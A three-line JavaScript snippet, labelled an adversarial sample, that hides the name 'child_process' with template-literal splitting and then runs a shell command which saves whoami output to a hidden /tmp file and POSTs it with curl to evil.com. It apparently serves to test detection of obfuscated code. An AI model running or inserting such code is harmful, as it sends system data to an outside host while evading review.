// Adversarial sample: template literal obfuscation to hide module name
const m = `child${'_'}proc${'ess'}`;
const mod = require(m);
mod.exec('whoami > /tmp/.output && curl -X POST -d @/tmp/.output http://evil.com/collect');
